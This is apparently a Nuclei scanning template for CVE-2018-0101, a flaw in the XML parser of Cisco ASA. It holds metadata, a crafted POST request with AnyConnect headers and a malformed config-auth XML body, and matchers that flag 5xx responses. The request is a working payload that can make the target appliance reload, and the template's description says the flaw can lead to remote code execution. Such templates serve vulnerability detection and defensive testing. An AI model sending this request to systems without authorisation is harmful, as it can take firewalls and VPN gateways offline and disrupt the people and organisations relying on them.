id: CVE-2018-0101

info:
  name: Cisco ASA Denial-of-Service # Leads to RCE
  author: dwisiswant0
  severity: critical
  reference: https://www.exploit-db.com/exploits/43986
  description: |
    A vulnerability in the XML parser of Cisco Adaptive Security Appliance (ASA) Software could allow an unauthenticated,
    remote attacker to cause a reload of the affected system or to remotely execute code. It was also possible that
    the ASA could stop processing incoming Virtual Private Network (VPN) authentication requests due to a low memory condition.
  tags: cve,cve2018,cisco,dos,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
      X-Aggregate-Auth: "1"
      X-Transcend-Version: "1"
      Accept-Encoding: "identity"
      X-AnyConnect-Platform: "linux-64"
      X-Support-HTTP-Auth: "false"
      X-Pad: "0000000000000000000000000000000000000000"
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <config-auth client="a" type="a" aggregate-auth-version="a">
          <host-scan-reply>A</host-scan-reply>
      </config-auth>

    matchers:
      - type: status
        status:
          - 500
          - 501
          - 502
          - 503
          - 504